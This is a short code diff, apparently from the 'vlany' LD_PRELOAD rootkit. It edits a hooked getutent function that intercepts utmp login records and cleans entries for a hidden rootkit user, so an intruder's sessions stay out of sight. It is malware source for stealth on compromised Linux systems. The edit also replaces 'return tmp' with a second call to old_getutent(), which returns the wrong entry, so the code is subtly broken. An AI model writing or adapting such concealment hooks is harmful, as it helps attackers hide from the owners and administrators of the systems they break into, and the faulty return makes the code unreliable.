@@ -6,8 +6,7 @@ struct utmp *getutent(void)
 
     HOOK(old_getutent, CGETUTENT);
 
-    struct utmp *tmp;
-    tmp = old_getutent();
+    struct utmp *tmp = old_getutent();
 
     if(tmp && tmp->ut_user != NULL)
     {
@@ -16,5 +15,5 @@ struct utmp *getutent(void)
         CLEAN(vlany_user);
     }
 
-    return tmp;
+    return old_getutent();
 }
